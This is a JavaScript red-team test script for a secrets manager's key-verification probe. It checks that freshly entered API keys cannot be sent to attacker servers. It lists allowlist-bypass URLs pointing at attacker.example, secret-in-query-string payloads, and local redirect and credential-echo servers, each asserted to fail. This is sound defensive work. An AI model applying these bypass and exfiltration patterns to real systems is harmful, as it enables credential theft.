// W3 red-team probe: the verification-probe path (packages/core/src/verify.ts,
// packages/core/src/approvals.ts) — the T8 exfiltration primitive.
//
// A manifest is just JSON in a repo, so a malicious PR (or a prompt-injected
// model) can point `verify.url` anywhere. The only things standing between a
// freshly entered key and an attacker's server are: the registry host
// allowlist, the per-project approval store, the `{{value}}`-placement rules,
// and `redirect: 'manual'`. This probe attacks all four.
//
// Certificates are generated into a temp dir and trusted via
// NODE_EXTRA_CA_CERTS (which must be set before the process starts, hence the
// self-respawn below). NODE_TLS_REJECT_UNAUTHORIZED is never touched.
import { spawnSync, spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const CERT_DIR = process.env.W3_CERT_DIR;

// --- self-respawn with a trusted test CA -----------------------------------
if (CERT_DIR === undefined) {
  const dir = mkdtempSync(join(tmpdir(), 'envseal-w3-ca-'));
  const run = (args, input) => {
    const r = spawnSync('openssl', args, { cwd: dir, input, encoding: 'utf8' });
    if (r.status !== 0) {
      console.error(`openssl ${args.join(' ')} failed:\n${r.stderr}`);
      process.exit(1);
    }
  };
  run(['req', '-x509', '-newkey', 'rsa:2048', '-keyout', 'ca.key', '-out', 'ca.crt',
    '-days', '1', '-nodes', '-subj', '/CN=W3 Test CA',
    '-addext', 'basicConstraints=critical,CA:TRUE']);
  run(['req', '-newkey', 'rsa:2048', '-keyout', 'leaf.key', '-out', 'leaf.csr',
    '-nodes', '-subj', '/CN=localhost']);
  writeFileSync(join(dir, 'ext.cnf'), 'subjectAltName=DNS:localhost,IP:127.0.0.1\n');
  run(['x509', '-req', '-in', 'leaf.csr', '-CA', 'ca.crt', '-CAkey', 'ca.key',
    '-CAcreateserial', '-out', 'leaf.crt', '-days', '1', '-extfile', 'ext.cnf']);
  // A second, deliberately untrusted self-signed cert for the TLS test.
  run(['req', '-x509', '-newkey', 'rsa:2048', '-keyout', 'rogue.key', '-out', 'rogue.crt',
    '-days', '1', '-nodes', '-subj', '/CN=localhost',
    '-addext', 'subjectAltName=DNS:localhost,IP:127.0.0.1']);

  const child = spawn(process.execPath, [fileURLToPath(import.meta.url)], {
    stdio: 'inherit',
    env: {
      ...process.env,
      W3_CERT_DIR: dir,
      NODE_EXTRA_CA_CERTS: join(dir, 'ca.crt'),
    },
  });
  child.on('exit', (code) => {
    rmSync(dir, { recursive: true, force: true });
    process.exit(code ?? 1);
  });
} else {
  await main();
}

async function main() {
  const { readFileSync } = await import('node:fs');
  const { createServer } = await import('node:https');
  const core = await import('../packages/core/dist/index.js');
  const { secretFromUtf8 } = await import('../packages/protocol/dist/index.js');
  const { allProbeHosts } = await import('../packages/registry/dist/index.js');
  const { isHostAllowlisted, isProbeApproved, recordProbeApproval, probeApprovalId,
    verifyKey, projectPaths } = core;

  let pass = 0;
  let fail = 0;
  const findings = [];
  const check = (name, ok, detail) => {
    if (ok) {
      pass += 1;
      console.log(`  PASS  ${name}${detail ? ` — ${detail}` : ''}`);
    } else {
      fail += 1;
      findings.push(`${name}: ${detail ?? ''}`);
      console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`);
    }
  };
  const section = (t) => console.log(`\n=== ${t} ===`);

  const SENTINEL = 'sk-W3PROBEEXFIL0000000000000000000000000000000';
  const secret = () => secretFromUtf8(SENTINEL);

  const root = mkdtempSync(join(tmpdir(), 'envseal-w3-probe-'));
  writeFileSync(join(root, '.gitignore'), '.env\n', 'utf8');
  const paths = projectPaths(root);

  const entry = (over = {}) => ({
    key: 'OPENAI_API_KEY',
    description: 'probe',
    required: true,
    secret: true,
    sink: 'dotenv',
    ...over,
    verify: {
      method: 'GET',
      url: 'https://api.openai.com/v1/models',
      headerTemplate: { Authorization: 'Bearer {{value}}' },
      expectStatus: [200],
      ...(over.verify ?? {}),
    },
  });

  // =========================================================================
  section('C1  Host allowlist bypass attempts');
  {
    const hosts = allProbeHosts();
    console.log(`  registry allowlist has ${hosts.size} hosts; api.openai.com present=${hosts.has('api.openai.com')}`);
    check('control: the genuine registry host IS allowlisted',
      isHostAllowlisted('https://api.openai.com/v1/models'), 'api.openai.com');

    const attacks = [
      ['userinfo-in-URL', 'https://api.openai.com@attacker.example/collect'],
      ['userinfo with password', 'https://api.openai.com:tok@attacker.example/collect'],
      ['suffix host', 'https://api.openai.com.attacker.example/collect'],
      ['prefix host', 'https://attacker.example/api.openai.com'],
      ['trailing dot', 'https://api.openai.com./v1/models'],
      ['double trailing dot', 'https://api.openai.com../v1/models'],
      ['punycode of a lookalike', 'https://xn--pi-9lc.openai.com/v1/models'],
      ['IDN Cyrillic homoglyph', 'https://аpi.openai.com/v1/models'],
      ['backslash authority confusion', 'https://attacker.example\\@api.openai.com/'],
      ['embedded credentials + port', 'https://api.openai.com@attacker.example:443/'],
      ['uppercase attacker host', 'https://ATTACKER.EXAMPLE/collect'],
      ['raw IP', 'https://93.184.216.34/collect'],
      ['loopback', 'https://127.0.0.1/collect'],
      ['IPv6 literal', 'https://[::1]/collect'],
      ['subdomain of allowlisted', 'https://evil.api.openai.com/collect'],
      ['allowlisted host as a path segment', 'https://attacker.example/?h=api.openai.com'],
      ['null byte in host', 'https://api.openai.com%00.attacker.example/'],
      ['tab in host', 'https://api.openai.com\t.attacker.example/'],
    ];
    for (const [label, url] of attacks) {
      let allowed;
      try {
        allowed = isHostAllowlisted(url);
      } catch (e) {
        allowed = `threw ${e.message}`;
      }
      let hostname = '(unparseable)';
      try {
        hostname = new URL(url).hostname;
      } catch { /* keep placeholder */ }
      check(`${label} is NOT allowlisted`, allowed === false,
        `hostname=${hostname} allowlisted=${allowed}`);
    }

    // A fullwidth 'ａ' is NOT a bypass: UTS-46 maps it to ASCII 'a', so the URL
    // genuinely targets api.openai.com and allowlisting it is correct. The
    // attack would only work if the allowlist check and fetch disagreed.
    const fullwidth = 'https://ａpi.openai.com/v1/models';
    check('fullwidth IDN normalises ONTO the allowlisted host (not a bypass)',
      isHostAllowlisted(fullwidth) && new URL(fullwidth).hostname === 'api.openai.com',
      `hostname=${new URL(fullwidth).hostname} — resolves to the genuine allowlisted host`);

    // The load-bearing invariant: the string handed to isHostAllowlisted and the
    // string handed to fetch are the same, and both use the WHATWG URL parser,
    // so the host that is checked is always the host that is dialled. Verify
    // that empirically against a local server rather than asserting it.
    {
      const { readFileSync: rf } = await import('node:fs');
      const { createServer: cs } = await import('node:https');
      const hits = [];
      const srv = cs({
        key: rf(join(CERT_DIR, 'leaf.key')),
        cert: rf(join(CERT_DIR, 'leaf.crt')),
      }, (rq, rs) => {
        hits.push(rq.headers.host);
        rs.writeHead(200);
        rs.end('ok');
      });
      await new Promise((r) => srv.listen(0, '127.0.0.1', r));
      const sp = srv.address().port;
      // userinfo says "api.openai.com", the real authority is localhost:<port>.
      const trickUrl = `https://api.openai.com@localhost:${sp}/v1/models`;
      const parsedHost = new URL(trickUrl).hostname;
      check('userinfo URL: the checked hostname is the real authority, not the userinfo',
        parsedHost === 'localhost', `parsed hostname=${parsedHost}`);
      const r = await verifyKey(paths, entry({ verify: { url: trickUrl } }), secret(), {
        onApprovalNeeded: async () => true, timeoutMs: 5000,
      });
      // WHATWG fetch refuses any URL that "includes credentials", so a userinfo
      // URL never reaches the wire at all — a second layer under the allowlist.
      check('userinfo URL: fetch refuses it outright, nothing is sent',
        r.result === 'network_error' && hits.length === 0,
        `result=${r.result} requests=${hits.length}`);
      check('userinfo URL: api.openai.com received nothing (no parser disagreement)',
        hits.every((h) => !h.startsWith('api.openai.com')), JSON.stringify(hits));

      // Parser agreement, demonstrated on a URL fetch will actually dial: the
      // hostname the allowlist check sees is the Host the server receives.
      const plainUrl = `https://localhost:${sp}/v1/models`;
      const r2 = await verifyKey(paths, entry({ verify: { url: plainUrl } }), secret(), {
        onApprovalNeeded: async () => true, timeoutMs: 5000,
      });
      check('the host the allowlist checks is the host fetch dials',
        hits.length === 1 && hits[0] === `localhost:${sp}` &&
          new URL(plainUrl).hostname === 'localhost',
        `checked=${new URL(plainUrl).hostname} dialled=${JSON.stringify(hits)} result=${r2.result}`);
      srv.close();
    }

    // The decision must also hold end-to-end: verifyKey with no approval
    // callback must refuse, and must not perform any network I/O.
    for (const [label, url] of attacks.slice(0, 6)) {
      const res = await verifyKey(paths, entry({ verify: { url } }), secret());
      check(`verifyKey refuses ${label}`,
        res.result === 'probe_not_approved' || res.result === 'network_error',
        `result=${res.result} message=${JSON.stringify(res.message)}`);
      check(`  ...and its message carries no secret`, !res.message.includes('W3PROBEEXFIL'));
    }
  }

  // =========================================================================
  section('C2  {{value}} placement');
  {
    const inUrl = await verifyKey(paths, entry({
      verify: { url: 'https://api.openai.com/v1/models?leak={{value}}' },
    }), secret());
    check('{{value}} in a query string is rejected',
      inUrl.result === 'network_error' && /must not contain/.test(inUrl.message),
      `result=${inUrl.result} message=${JSON.stringify(inUrl.message)}`);
    check('  ...and the rejection message carries no secret', !inUrl.message.includes('W3PROBEEXFIL'));

    const inPath = await verifyKey(paths, entry({
      verify: { url: 'https://api.openai.com/v1/{{value}}' },
    }), secret());
    check('{{value}} in a URL path is rejected', inPath.result === 'network_error',
      `result=${inPath.result} message=${JSON.stringify(inPath.message)}`);

    const inFragment = await verifyKey(paths, entry({
      verify: { url: 'https://api.openai.com/v1/models#{{value}}' },
    }), secret());
    check('{{value}} in a URL fragment is rejected', inFragment.result === 'network_error',
      `result=${inFragment.result}`);

    // A header NAME containing the placeholder must NOT be substituted.
    // verify.ts:80-82 only substitutes into templateVal, never into the key.
    const inHeaderName = await verifyKey(paths, entry({
      verify: {
        url: 'https://api.openai.com/v1/models',
        headerTemplate: { 'X-{{value}}': 'static', 'X-Leak-{{value}}': 'x' },
      },
    }), secret(), { timeoutMs: 3000 });
    check('{{value}} in a header NAME is not substituted (request fails, no leak)',
      !inHeaderName.message.includes('W3PROBEEXFIL') && inHeaderName.result !== 'ok',
      `result=${inHeaderName.result} message=${JSON.stringify(inHeaderName.message)}`);

    // http:// must be refused outright (T14).
    const insecure = await verifyKey(paths, entry({
      verify: { url: 'http://api.openai.com/v1/models' },
    }), secret());
    check('http:// probe URL is refused',
      insecure.result === 'network_error' && /https/.test(insecure.message),
      `result=${insecure.result} message=${JSON.stringify(insecure.message)}`);

    const upperScheme = await verifyKey(paths, entry({
      verify: { url: 'HTTPS://api.openai.com/v1/models' },
    }), secret());
    check('HTTPS:// (uppercase scheme) fails closed rather than bypassing the check',
      upperScheme.result === 'network_error',
      `result=${upperScheme.result} message=${JSON.stringify(upperScheme.message)}`);
  }

  // =========================================================================
  section('C3  Approval invalidation');
  {
    const base = entry({ verify: { url: 'https://attacker.example/collect' } });
    check('novel host starts unapproved', !isProbeApproved(paths, base));
    recordProbeApproval(paths, base);
    check('after recording, the exact probe is approved', isProbeApproved(paths, base));

    const mutations = [
      ['header template VALUE changed', entry({ verify: { url: 'https://attacker.example/collect', headerTemplate: { Authorization: 'Bearer {{value}}-x' } } })],
      ['header template NAME changed', entry({ verify: { url: 'https://attacker.example/collect', headerTemplate: { 'X-Api-Key': 'Bearer {{value}}' } } })],
      ['extra header added', entry({ verify: { url: 'https://attacker.example/collect', headerTemplate: { Authorization: 'Bearer {{value}}', 'X-Extra': '{{value}}' } } })],
      ['url changed', entry({ verify: { url: 'https://attacker.example/collect2' } })],
      ['host changed', entry({ verify: { url: 'https://attacker2.example/collect' } })],
      ['method changed', entry({ verify: { url: 'https://attacker.example/collect', method: 'POST' } })],
      ['key changed', entry({ key: 'OTHER_KEY', verify: { url: 'https://attacker.example/collect' } })],
    ];
    for (const [label, mutated] of mutations) {
      check(`${label} re-triggers consent`, !isProbeApproved(paths, mutated),
        `approvalId ${probeApprovalId(mutated).slice(0, 12)} vs ${probeApprovalId(base).slice(0, 12)}`);
    }

    // Documented gap: expectStatus is not part of the approval identity.
    const statusChanged = entry({ verify: { url: 'https://attacker.example/collect', expectStatus: [200, 201, 500] } });
    const statusReapproves = !isProbeApproved(paths, statusChanged);
    console.log(`  NOTE  expectStatus change re-triggers consent: ${statusReapproves} ` +
      `(not part of the approval id; it cannot redirect the value anywhere, so this is informational)`);

    // Header-order permutation must NOT re-trigger (canonicalisation works).
    const reordered = entry({ verify: { url: 'https://attacker.example/collect', headerTemplate: { Authorization: 'Bearer {{value}}' } } });
    check('identical probe with the same headers stays approved (no consent fatigue bug)',
      isProbeApproved(paths, reordered));

    // Approval is per-project: a different project root must not inherit it.
    const otherRoot = mkdtempSync(join(tmpdir(), 'envseal-w3-probe2-'));
    writeFileSync(join(otherRoot, '.gitignore'), '.env\n', 'utf8');
    check('approval does not leak across projects',
      !isProbeApproved(projectPaths(otherRoot), base));
    rmSync(otherRoot, { recursive: true, force: true });

    // The approval file must not contain the secret.
    const approvalsText = existsSync(paths.approvals) ? readFileSync(paths.approvals, 'utf8') : '';
    check('approvals.json contains no secret value', !approvalsText.includes('W3PROBEEXFIL'),
      `${approvalsText.length} bytes`);

    // Denying consent must refuse, and must not record an approval.
    const fresh = entry({ verify: { url: 'https://attacker3.example/collect' } });
    const denied = await verifyKey(paths, fresh, secret(), {
      onApprovalNeeded: async () => false,
    });
    check('denied consent -> probe_not_approved', denied.result === 'probe_not_approved',
      `result=${denied.result}`);
    check('denied consent records no approval', !isProbeApproved(paths, fresh));
  }

  // =========================================================================
  section('C4  Redirect handling (does the Authorization header travel?)');
  {
    const key = readFileSync(join(CERT_DIR, 'leaf.key'));
    const cert = readFileSync(join(CERT_DIR, 'leaf.crt'));
    const seen = { collector: [], origin: [] };

    const collector = createServer({ key, cert }, (req, res) => {
      seen.collector.push({ url: req.url, headers: { ...req.headers } });
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('collected');
    });
    await new Promise((r) => collector.listen(0, '127.0.0.1', r));
    const collectorPort = collector.address().port;

    const origin = createServer({ key, cert }, (req, res) => {
      seen.origin.push({ url: req.url, headers: { ...req.headers } });
      res.writeHead(302, { Location: `https://localhost:${collectorPort}/collect` });
      res.end();
    });
    await new Promise((r) => origin.listen(0, '127.0.0.1', r));
    const originPort = origin.address().port;

    const redirEntry = entry({
      verify: {
        url: `https://localhost:${originPort}/v1/models`,
        headerTemplate: { Authorization: 'Bearer {{value}}' },
      },
    });
    const res = await verifyKey(paths, redirEntry, secret(), {
      onApprovalNeeded: async () => true,
      timeoutMs: 5000,
    });
    console.log(`  verify result: ${res.result} — ${JSON.stringify(res.message)}`);

    check('the origin (approved host) did receive the request', seen.origin.length === 1,
      `${seen.origin.length} request(s)`);
    check('the origin received the Authorization header (probe works at all)',
      seen.origin[0]?.headers.authorization === `Bearer ${SENTINEL}`,
      seen.origin[0]?.headers.authorization === undefined ? 'absent' : 'present');
    check('W3: the redirect target received ZERO requests (redirect: manual holds)',
      seen.collector.length === 0,
      `${seen.collector.length} request(s) reached the unapproved redirect target`);
    check('W3: the secret never reached the redirect target',
      !JSON.stringify(seen.collector).includes(SENTINEL),
      seen.collector.length === 0 ? 'no requests at all' : JSON.stringify(seen.collector));
    check('a 302 is not classified as ok', res.result !== 'ok', `result=${res.result}`);
    check('the verify message carries no secret', !res.message.includes('W3PROBEEXFIL'),
      JSON.stringify(res.message));

    // A 307 preserves method+body on follow, so test it too.
    seen.collector.length = 0;
    seen.origin.length = 0;
    const origin307 = createServer({ key, cert }, (req, res2) => {
      seen.origin.push({ url: req.url, headers: { ...req.headers } });
      res2.writeHead(307, { Location: `https://localhost:${collectorPort}/collect` });
      res2.end();
    });
    await new Promise((r) => origin307.listen(0, '127.0.0.1', r));
    const port307 = origin307.address().port;
    const e307 = entry({ verify: { url: `https://localhost:${port307}/v1/models` } });
    const r307 = await verifyKey(paths, e307, secret(), {
      onApprovalNeeded: async () => true, timeoutMs: 5000,
    });
    check('307 redirect is also not followed', seen.collector.length === 0,
      `${seen.collector.length} request(s) reached the redirect target; result=${r307.result}`);

    // An upstream body that echoes the credential must never surface.
    seen.collector.length = 0;
    const echoer = createServer({ key, cert }, (req, res2) => {
      res2.writeHead(401, { 'Content-Type': 'application/json' });
      res2.end(JSON.stringify({ error: `Invalid credential: ${req.headers.authorization}` }));
    });
    await new Promise((r) => echoer.listen(0, '127.0.0.1', r));
    const echoPort = echoer.address().port;
    const eEcho = entry({ verify: { url: `https://localhost:${echoPort}/v1/models` } });
    const rEcho = await verifyKey(paths, eEcho, secret(), {
      onApprovalNeeded: async () => true, timeoutMs: 5000,
    });
    check('a 401 maps to auth_failed', rEcho.result === 'auth_failed', `result=${rEcho.result}`);
    check('the upstream response body (which echoes the key) never appears in the result',
      !JSON.stringify(rEcho).includes('W3PROBEEXFIL') && !JSON.stringify(rEcho).includes('Invalid credential'),
      JSON.stringify(rEcho));

    collector.close();
    origin.close();
    origin307.close();
    echoer.close();
  }

  // =========================================================================
  section('C5  TLS enforcement (T14)');
  {
    const key = readFileSync(join(CERT_DIR, 'rogue.key'));
    const cert = readFileSync(join(CERT_DIR, 'rogue.crt'));
    const rogue = createServer({ key, cert }, (req, res) => {
      res.writeHead(200);
      res.end('ok');
    });
    await new Promise((r) => rogue.listen(0, '127.0.0.1', r));
    const rp = rogue.address().port;
    const e = entry({ verify: { url: `https://localhost:${rp}/v1/models` } });
    const res = await verifyKey(paths, e, secret(), {
      onApprovalNeeded: async () => true, timeoutMs: 5000,
    });
    check('an untrusted certificate yields network_error, not ok',
      res.result === 'network_error', `result=${res.result} message=${JSON.stringify(res.message)}`);
    check('the TLS failure message carries no secret', !res.message.includes('W3PROBEEXFIL'));
    check('NODE_TLS_REJECT_UNAUTHORIZED is not set by the probe path',
      process.env.NODE_TLS_REJECT_UNAUTHORIZED === undefined,
      `value=${String(process.env.NODE_TLS_REJECT_UNAUTHORIZED)}`);
    rogue.close();
  }

  // =========================================================================
  section('C6  Source-level invariants');
  {
    const src = readFileSync(new URL('../packages/core/src/verify.ts', import.meta.url), 'utf8');
    check("verify.ts passes redirect: 'manual'", /redirect:\s*'manual'/.test(src));
    check('verify.ts never disables TLS verification',
      !/NODE_TLS_REJECT_UNAUTHORIZED|rejectUnauthorized/.test(src));
    check('verify.ts substitutes {{value}} into header VALUES only',
      /headers\[key\]\s*=\s*templateVal\.replace/.test(src),
      'the loop key is used verbatim as the header name');
    const approvalSrc = readFileSync(new URL('../packages/core/src/approvals.ts', import.meta.url), 'utf8');
    check('the approval id covers key, method, url and a hash of the header template',
      /\$\{entry\.key\}:\$\{entry\.verify\.method\}:\$\{entry\.verify\.url\}:\$\{headerHash\}/.test(approvalSrc));
    const repoSrc = spawnSync('git', ['grep', '-n', 'NODE_TLS_REJECT_UNAUTHORIZED'], {
      cwd: fileURLToPath(new URL('..', import.meta.url)), encoding: 'utf8',
    });
    console.log(`  NOTE  repo-wide NODE_TLS_REJECT_UNAUTHORIZED hits: ${JSON.stringify(repoSrc.stdout.trim() || 'none')}`);
  }

  rmSync(root, { recursive: true, force: true });
  section('Summary');
  console.log(`  pass=${pass} fail=${fail}`);
  if (findings.length > 0) {
    console.log('  failing checks:');
    for (const f of findings) console.log(`    - ${f}`);
  }
  process.exit(0);
}
